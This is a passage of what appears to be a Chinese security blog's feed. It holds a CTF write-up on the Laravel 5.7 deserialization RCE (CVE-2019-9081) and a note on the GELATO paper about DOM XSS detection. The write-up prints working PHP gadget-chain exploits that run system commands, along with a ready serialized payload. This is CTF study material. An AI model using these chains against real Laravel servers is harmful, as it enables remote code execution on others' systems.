</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>EXP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/06/28/4vfwJAILg7Trt3X.jpg" alt="-w1493"></p><h3 id="0x05-CVE-2019-9081的参考链接"><a href="#0x05-CVE-2019-9081的参考链接" class="headerlink" title="0x05 CVE-2019-9081的参考链接"></a>0x05 CVE-2019-9081的参考链接</h3><ol><li><a href="https://xz.aliyun.com/t/5483" target="_blank" rel="noopener">Laravel5.7反序列化漏洞之RCE链挖掘</a></li><li><a href="https://www.cnblogs.com/tr1ple/p/11079354.html" target="_blank" rel="noopener">代码审计之CVE-2019-9081 Laravel5.7 反序列化 RCE复现分析</a></li><li><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">laravelv5.7反序列化rce(CVE-2019-9081)</a></li></ol><h3 id="0x06-第五空间–laravel"><a href="#0x06-第五空间–laravel" class="headerlink" title="0x06 第五空间–laravel"></a>0x06 第五空间–laravel</h3><p>Diff一下的发现其实题目中所做的修改仅仅是删除了<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php</code>文件中的<code>$this-&gt;run();</code>这一行代码。没有这个调用点，那我们的思路就是在其中找一个<code>call_user_func</code>来执行<code>Illuminate/Foundation/Testing/PendingCommand</code>类中的<code>run</code>方法。<br><img src="https://i.loli.net/2020/06/28/BZt24oINVxg36iz.png" alt="-w1050"><br>此处我们使用<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>文件中的<code>call_user_func</code>函数来完成对<code>run</code>的调用<br><img src="https://i.loli.net/2020/06/28/PnVRAUZWHGxfi27.png" alt="-w931"><br>这个思路其实并不是新的，PHPGGC当中就经常只用这个点，因为<code>ValidGenerator</code>类中的<code>__call</code>比较好利用，而其中又包含了<code>call_user_func_array</code>、<code>call_user_func</code>。所以结合这个点很容易就构造出下面这个Exp。具体的不在多写，如果有不清楚的可以看后面的参考链接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Exp来自chamd5 wp</span></span><br><span class="line"><span class="comment">//gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters, $class, $app)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings = $bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CollectionConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">public</span> $collection;</span><br><span class="line">        <span class="keyword">public</span> $prefixes;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;prefixes = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;collection = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">"12end"</span> =&gt; <span class="string">"12end"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ValidGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">generator</span>;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($validator)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">"12end"</span> =&gt; <span class="string">"12end"</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">RouteCollection</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//chain.php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"gadgets.php"</span>;</span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">    <span class="string">"system"</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>),</span><br><span class="line">    <span class="keyword">new</span> Illuminate\Auth\GenericUser(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span> =&gt; <span class="keyword">array</span>(<span class="string">"0"</span> =&gt; <span class="string">"1"</span>), <span class="string">"expectedQuestions"</span> =&gt; <span class="keyword">array</span>(<span class="string">"0"</span> =&gt; <span class="string">"1"</span>))),</span><br><span class="line">    <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span> =&gt; <span class="keyword">array</span>(<span class="string">"concrete"</span> =&gt; <span class="string">"Illuminate\Foundation\Application"</span>)))</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Faker\ValidGenerator(<span class="keyword">array</span>($payload, <span class="string">"run"</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator($a)));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/28/RErawMfy9oPpqBS.png" alt="-w1133"></p><h3 id="0x07-第五空间laravel题解参考"><a href="#0x07-第五空间laravel题解参考" class="headerlink" title="0x07 第五空间laravel题解参考"></a>0x07 第五空间laravel题解参考</h3><ol><li><a href="https://mp.weixin.qq.com/s/TyJsK5Rkg6MXvADS13RIcA" target="_blank" rel="noopener">第五空间-WriteUp</a></li><li><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链(一)</a></li><li><a href="http://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note/#0x06-lumenserial" target="_blank" rel="noopener">Code-breaking Puzzles 2018 Note–lumenserial</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;前天第五空间的时候5am3问我还会搞Laravel不。半年没打CTF了，真的是淡忘了很多，再加上当时
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Gelato-&gt;Feedback-driven and Guided Security Analysis of Client-side Web Applications</title>
    <link href="http://zer0yu.github.io/2020/06/25/Gelato-Feedback-driven-and-Guided-Security-Analysis-of-Client-side-Web-Applications/"/>
    <id>http://zer0yu.github.io/2020/06/25/Gelato-Feedback-driven-and-Guided-Security-Analysis-of-Client-side-Web-Applications/</id>
    <published>2020-06-25T12:20:21.000Z</published>
    <updated>2020-06-25T12:21:51.301Z</updated>
    
    <content type="html"><![CDATA[<p>笔记作者：z3r0yu<br>论文作者：Behnaz Hassanshahi, Hyunjun Lee, Paddy Krishnan, Jörn Güy Suß<br>论文链接：<a href="https://arxiv.org/abs/2004.06292" target="_blank" rel="noopener">https://arxiv.org/abs/2004.06292</a><br>论文来源：2020年发表在预发表平台arxiv上</p><h3 id="0x01-主要内容"><a href="#0x01-主要内容" class="headerlink" title="0x01 主要内容"></a>0x01 主要内容</h3><ol><li>总结了安全感知的客户端分析爬虫应该支持的最关键的功能(15个)</li><li>GELATO:检测建立在复杂库和框架上的现代客户端JavaScript应用的漏洞(DOM XSS漏洞)</li><li>反馈驱动的安全感知引导的爬虫技术</li><li>新的轻量级客户端污点分析方法，直接对JS进行插桩，无需修改浏览器内核，可以对JavaScript应用程序上的非平凡(non-trivial)污点流进行报告</li><li>新颖的分阶段污点推理分析，能够高精度地检测基于DOM的潜在XSS漏洞</li></ol><h3 id="0x02-FEEDBACK-DRIVEN-GUIDED-AND-SECURITY-AWARE-CRAWLING-OF-MODERN-WEB-APPLICATIONS"><a href="#0x02-FEEDBACK-DRIVEN-GUIDED-AND-SECURITY-AWARE-CRAWLING-OF-MODERN-WEB-APPLICATIONS" class="headerlink" title="0x02 FEEDBACK-DRIVEN , GUIDED , AND SECURITY-AWARE CRAWLING OF MODERN WEB APPLICATIONS"></a>0x02 FEEDBACK-DRIVEN , GUIDED , AND SECURITY-AWARE CRAWLING OF MODERN WEB APPLICATIONS</h3><p>Gelato: 利用反馈驱动的方法，根据目标安全分析的要求，自动引导状态感知爬虫。</p><p>算法的输入：一个网络应用的URL、一个目标安全分析TA和一组爬虫应该被引导的程序位置Loc<br>输出：目标分析的结果 (循环一直持续到爬虫到达一个ﬁxpoint，并且没有更多的新状态可以访问)</p><p>在每次迭代时，我们对给定状态S(这个S是页面的状态改变)中的JavaScript和HTML代码运行目标安全分析TA，并收集结果。</p><p>同时，作者对新发现的JavaScript代码运行近似的调用图分析，并使用轻量级工具收集执行跟踪。执行跟踪帮助我们确定实际的（真阳性）函数调用，从而去除假阳性调用图边缘，并将新发现的调用图添加到ACG中，ACG中包含了应用程序中已探索部分的调用图。PrioritizeEvent(S，ACG)根据使用ACG和当前状态S来决定下一步应该触发哪个事件。 </p><p><img src="https://i.loli.net/2020/06/25/Pibk5QWs2OzGnyI.png" alt="-w413"></p><h4 id="A-State-representation-and-comparison"><a href="#A-State-representation-and-comparison" class="headerlink" title="A. State representation and comparison"></a>A. State representation and comparison</h4><p>状态感知爬虫最重要的就是对状态的表示。理想情况下，我们希望存储整个浏览器和服务器的状态，以便能够在状态之间优雅地来回切换。然而，在每个状态中保存如此庞大的信息量是不现实的。为了解决这个挑战，作者尝试通过只存储状态的大小来保持最小化。表示状态的关键元素是(1)URL；(2)DOM树。作者记录了对父状态和子状态的引用，以便能够重放为达到当前状态而触发的事件序列。</p><p>判断当前状态是否已经访问过了的启发式方法：<br>(1)URL的路径段相同；<br>(2)DOM树的大小没有发生巨大变化(小于阈值)；<br>(3)DOM树的哈希计算结果完全相同，或者DOM树结构的差异小于阈值。</p><h4 id="B-Search-strategy"><a href="#B-Search-strategy" class="headerlink" title="B. Search strategy"></a>B. Search strategy</h4><p>深度优先搜索（DFS）来探索状态S。回到已访问状态的一种方法是重放事件序列，从根部一路到达特定状态。这种方法需要触发许多不必要的事件，这会极大地影响爬虫的效率。</p><p>一种启发式方法将浏览器带到之前访问过的状态：<br>(1)检查是否可以通过触发当前状态的另一个事件来达到目标状态；<br>(2)计算状态图中达到目标状态的最短路径。</p><h4 id="C-Call-graph-reﬁnement"><a href="#C-Call-graph-reﬁnement" class="headerlink" title="C. Call graph reﬁnement"></a>C. Call graph reﬁnement</h4><ol><li>cg是静态构成的(也就是ComputeACG函数)，它就是状态S中执行的JavaScript代码生成一个近似的调用图</li><li>在爬虫与用户界面的交互过程中，收集函数调用作为执行跟踪的一部分。接下来对这个执行跟踪进行处理，以检查调用图中是否有一条边缺失或为假阳性。调用图会根据这些新信息进行更新。(也就是refineACG函数)</li></ol><h4 id="D-Prioritization"><a href="#D-Prioritization" class="headerlink" title="D. Prioritization"></a>D. Prioritization</h4><p>如果当下的状态S包含我们需要的Loc(目标位置)，那么就使用ACG图中的最短路径进行触发事件序列(引导爬虫到达目标位置)</p><h4 id="E-Input-value-generation"><a href="#E-Input-value-generation" class="headerlink" title="E. Input value generation"></a>E. Input value generation</h4><p>前端JavaScript一般接受的输入值：表单、URL、Cookie、本地存储等。但是一般对应的代码会有防护措施，比如处理掉一些不允许的字符。这里要检测的是DOM XSS漏洞，那么它就必须对前端的过滤(这里也不是严格的过滤，其实就是针对处理字符的函数)进行一个bypass。作者就使用对URL类型输入值的生成作为例子讲述此处的分析算法(这个算法的输入是当前状态S和目标分析TA)。</p><p>为了bypass路径上的guards：</p><ol><li>在执行过程中收集感兴趣的运行时值，构造路径约束，并求解它们以生成输入值</li><li>运行时值的例子是条件语句中的操作数和字符串函数调用中的参数（例如，string.substring内置函数），它们在执行路径上被触发来对我们的输入做校验。</li><li>这些运行时收集的值将会作为约束，在后面约束输入的生成。</li></ol><h4 id="F-Support-for-other-features"><a href="#F-Support-for-other-features" class="headerlink" title="F. Support for other features"></a>F. Support for other features</h4><p><strong>动态事件处理程序注册</strong>。我们执行动态分析来收集运行时的值、痕迹，并捕获静态难以检测的事件。为了执行动态分析，我们对JavaScript代码进行工具化处理以收集痕迹，并hook事件处理程序以捕获那些在运行时无法发现的事件。还有很多情况下，事件注册是在库中通过复杂的机制完成的，并不直接（例如jQuery中的事件委托机制）。在这种情况下，我们使用常见的库和框架的模型，允许我们从其内部数据存储中提取所需的信息。</p><p><strong>静态链接提取</strong>。与大多数现有的爬虫类似，我们从HTML页面中静态提取链接。此外，我们将静态链接提取与状态优先级相结合，具体如下。在状态感知抓取开始之前，GELATO从URL开始静态提取HTML页面的链接。这一步让我们可以检索到Web应用的部分和粗粒度结构。我们还为提取的页面的JavaScript代码静态地建立调用图，如果它们包含用户指定的目标位置（算法1中的Loc），则将它们优先用于状态感知抓取</p><p><strong>表单填写</strong>。GELATO用提供的有效载荷作为conﬁguration填充表单。此处就是就使用了输入值生成技术。</p><h3 id="0x03-TARGET-SECURITY-ANALYSIS-DOM-BASED-XSS-DETECTION"><a href="#0x03-TARGET-SECURITY-ANALYSIS-DOM-BASED-XSS-DETECTION" class="headerlink" title="0x03 TARGET SECURITY ANALYSIS: DOM-BASED XSS DETECTION"></a>0x03 TARGET SECURITY ANALYSIS: DOM-BASED XSS DETECTION</h3><p>动态污点分析是检测动态语言编写的应用程序中注入漏洞的常用技术。然而，在实践中，必须解决几个<strong>技术挑战</strong>，以实现能够分析实际应用的动态污点分析。</p><ol><li><p>通过non-instrumented代码跟踪污点。因为JavaScript引擎通常是用低级语言（C，C++）实现的，所以基于工具的动态分析将无法插桩所有的内置函数（例如，数组修改和字符串操作）。此外，出于效率的原因，通常最好不要对整个应用程序进行插桩处理，难免留下一些模块。因此，分析需要模拟未插桩代码中发生的情况，并相应地更新污点标签。处理未插桩代码的一种常见方法是使用手动创建的模型。所以模型就决定了动态分析结果的好坏。但是现有研究的模型不是包含错误就是不完整。</p></li><li><p>将污点标签附加到原始值上。原始值是不能用附加属性进行扩展的，所以常见的方式就是讲原始值包装在一个对象中，这个对象上标识了该处值的污点标签属性。但是这是一个会改变原始程序执行的侵入性过程，所以必须注意不要改变其语义。但是在保留原始程序语义的同时封装原始值是极具挑战性的。可能是因为这些问题的存在Jalangi2中已经不采用封装原始值的方式。</p></li></ol><p>本文的解决方案：基于源代码插桩；非侵入式(不改变语义)动态污点推理</p><p>关键是关联source和sink的值，观察程序的行为而不是附加和跟踪污点标签来推断污点(就是判断经过过滤之后对应位置是否还是一个污点，因为并不是存在敏感点的位置就是一个污点的位置)。本文提出了一个阶段性的方法，主要可以划分为以下几个阶段(一个菱形块儿是一个阶段)：</p><p><img src="https://i.loli.net/2020/06/25/GvgJ3pQsRMjUkOa.png" alt="-w417"></p><h3 id="0x04-实验评估"><a href="#0x04-实验评估" class="headerlink" title="0x04 实验评估"></a>0x04 实验评估</h3><p>评估是针对如下问题进行验证：</p><ul><li>RQ1：GELATO的反馈驱动和引导爬行技术在覆盖率和性能方面的效果如何？</li><li>RQ2：GELATO与其他工具相比，发现的URL数量如何？</li><li>RQ3: 与最先进的污点分析技术相比，GELATO基于DOM的XSS检测技术在精度和召回方面的效果如何？</li></ul><h4 id="A-Choosing-benchmarks"><a href="#A-Choosing-benchmarks" class="headerlink" title="A. Choosing benchmarks"></a>A. Choosing benchmarks</h4><p>篇文章的benchmark的来源为：vulnerable open-source applications, vulnerable libraries, our in-house applications, and micro-benchmarks</p><h4 id="B-RQ1-effectiveness-of-our-feedback-driven-and-guided-crawling-technique"><a href="#B-RQ1-effectiveness-of-our-feedback-driven-and-guided-crawling-technique" class="headerlink" title="B. RQ1: effectiveness of our feedback-driven and guided crawling technique"></a>B. RQ1: effectiveness of our feedback-driven and guided crawling technique</h4><p>测量应用程序上AJAX调用(每个策略随时间变化的不同AJAX调用次数)的性能和覆盖率，来评估本文的反馈驱动和引导式抓取技术的有效性。</p><p>下图显示了本文的引导式爬虫策略与非引导式随机爬虫策略的比较。请注意，随机策略仍然得益于我们的动态分析技术，只是用随机选择代替了算法1中的状态和事件优先级函数。</p><p>评估了三个版本的引导式爬行技术：<br>(1) ACG + Models，当近似调用图无法有效分析库时，使用手动制作的模型，如jQuery；<br>(2) ACG + EA，这是我们的反馈驱动的边缘添加技术，在运行时执行过程中重新定义静态生成的调用图，并添加新发现的边缘；<br>(3) ACG + BOTH，同时使用Models和EA。通过比较这三个版本，我们评估了我们新颖的ACG边缘添加技术的有效性，该技术是完全自动的，可以在手工制作的库模型不可用时使用。</p><p><img src="https://i.loli.net/2020/06/25/Qtl6HraowvVEX5s.png" alt="-w425"></p><p>从实验结果可以看出<strong>引导式爬行策略</strong>比随机策略在所有三个应用中更快地找到AJAX调用，这三个应用都使用了现代技术，而且爬行的速度非同小可。此外，我们的反馈驱动边缘加法（ACG EA）技术也被证明是有效的：该技术发现的AJAX调用数量与精心构建的人工模型处于相同的范围内。</p><h4 id="C-Results-for-DOM-based-XSS-detection"><a href="#C-Results-for-DOM-based-XSS-detection" class="headerlink" title="C. Results for DOM-based XSS detection"></a>C. Results for DOM-based XSS detection</h4><p>这个部分主要是评估本文的阶段性污点推理技术在具有已知基于DOM的XSS漏洞的微型基准和库上的有效性。</p><p>benchmark: Google的Firing Range和IBM的基准。</p><p>比较对象：DexterJS中的动态污点跟踪；CTT（Chromium Taint Tracking）[16年的USENIX]</p><p>表三显示本年的框架比DexterJS和CTT发现了更多的污点。这在urldom测试用例中尤其明显，文本的框架能够检测到明显更多的URL可控测试用例。<br><img src="https://i.loli.net/2020/06/25/TKFiADd5va3IzMq.png" alt="-w427"></p><p>表四的结果表明，在0x03中讨论的减少假阳性的策略在降低假阳性率和提高精度方面非常有效。<br><img src="https://i.loli.net/2020/06/25/BQLniF68sEhGHxz.png" alt="-w428"></p><p>表五报告了本文的污点推理机制在一些存在已知漏洞的JavaScript库上的有效性<br><img src="https://i.loli.net/2020/06/25/hJecjMiAydOW8C5.png" alt="-w436"></p><p>表六显示，GELATO可以成功检测到非平凡的现代web应用中基于DOM的XSS漏洞，而其他工具却没有报告这些漏洞。为了检测这些应用中的漏洞，需要一个状态感知的爬虫来触发脆弱路径。在这个实验中，GELATO是唯一一个拥有有效的状态感知爬虫的工具，成功地探索了应用程序并触发了脆弱路径。<br><img src="https://i.loli.net/2020/06/25/vZYzsTA2UCbJcaq.png" alt="-w423"></p><p>表七：比较我们基于DOM的XSS检测的引导爬行策略（ACG）和随机策略（Random）。<br><img src="https://i.loli.net/2020/06/25/DzNQH4bR2J3dPxo.png" alt="-w431"></p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>在本文中，我们提出了一个动态分析工具GELATO，可以检测现代和复杂的<strong>客户端JavaScript应用程序中的漏洞</strong>，这些应用程序通常建立在库和框架之上。我们研究了最先进的工具，并提出了一个<strong>安全感知的客户端分析应该支持的最关键功能</strong>。作者提出了<strong>第一个安全引导的客户端分析</strong>，通过采取<strong>反馈驱动</strong>的方法，<strong>结合静态和动态分析</strong>来自动分析复杂的框架，并有效地提高程序中安全敏感部分的覆盖率，从而缩小了状态感知爬行和客户端安全分析之间的差距。作者对GELATO进行了不同复杂程度的应用和基准的评估，结果显示其<strong>性能优于现有的爬虫</strong>。最后，我们提出了一种新的轻量级<strong>非侵入式客户端污点分析方法</strong>，它可以报告现代JavaScript应用中的非平凡污点，并且与现有的动态客户端污点分析工具相比具有更高的准确性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;笔记作者：z3r0yu&lt;br&gt;论文作者：Behnaz Hassanshahi, Hyunjun Lee, Paddy Krishnan, Jörn Güy Suß&lt;br&gt;论文链接：&lt;a href=&quot;https://arxiv.org/abs/2004.06292&quot; targ
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FUSE-&gt;Finding File Upload Bugs via Penetration Testing</title>
    <link href="http://zer0yu.github.io/2020/06/04/FUSE-Finding-File-Upload-Bugs-via-Penetration-Testing/"/>
    <id>http://zer0yu.github.io/2020/06/04/FUSE-Finding-File-Upload-Bugs-via-Penetration-Testing/</id>
    <published>2020-06-04T03:04:19.000Z</published>
    <updated>2020-06-04T03:05:18.490Z</updated>
    
